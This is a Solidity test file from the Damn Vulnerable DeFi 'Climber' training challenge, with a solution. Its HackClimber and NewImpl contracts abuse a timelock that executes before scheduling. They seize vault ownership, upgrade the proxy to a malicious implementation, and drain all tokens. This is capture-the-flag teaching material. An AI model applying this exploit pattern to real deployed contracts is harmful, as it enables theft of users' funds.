// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        HackClimber hack = new HackClimber(vault, timelock, token, recovery);
        hack.pwnExecute();
        (bool ok,) = address(vault).call(abi.encodeWithSignature("pwnWithdrawAll()"));
        require(ok);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract HackClimber {
    ClimberVault vault;
    ClimberTimelock timelock;
    NewImpl newImple;

    address[] targets = new address[](4);
    uint256[] values = new uint256[](4);
    bytes[] calldatas = new bytes[](4);

    // keccak256("PROPOSER_ROLE");
    bytes32 constant PROPOSE_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;
    DamnValuableToken token;
    address recovery;

    constructor(ClimberVault _vault, ClimberTimelock _timelock, DamnValuableToken _token, address _recovery) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        recovery = _recovery;
    }

    function _setValues() internal {
        targets = [address(timelock), address(timelock), address(vault), address(this)];
        values = [0, 0, 0, 0];
        calldatas = [
            abi.encodeWithSignature("updateDelay(uint64)", 0), //slot 0
            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSE_ROLE, address(this)), //slot 1
            abi.encodeWithSignature("transferOwnership(address)", address(this)), //slot 2
            abi.encodeWithSignature("schedule()") //slot 3
        ];
    }

    function pwnExecute() external {
        _setValues();
        timelock.execute(targets, values, calldatas, "1");

        newImple = new NewImpl(token, recovery, vault);
        vault.upgradeToAndCall(address(newImple), "");
    }

    function schedule() external {
        timelock.schedule(targets, values, calldatas, "1");
    }
}

contract NewImpl is ClimberVault {
    DamnValuableToken immutable token;
    address immutable recovery;
    ClimberVault immutable vault;

    constructor(DamnValuableToken _token, address _recovery, ClimberVault _vault) {
        token = _token;
        recovery = _recovery;
        vault = _vault;
    }

    function pwnWithdrawAll() external {
        require(address(this) == address(vault), "ajab");
        bool ok = token.transfer(recovery, token.balanceOf(address(this)));
        require(ok);
    }
}

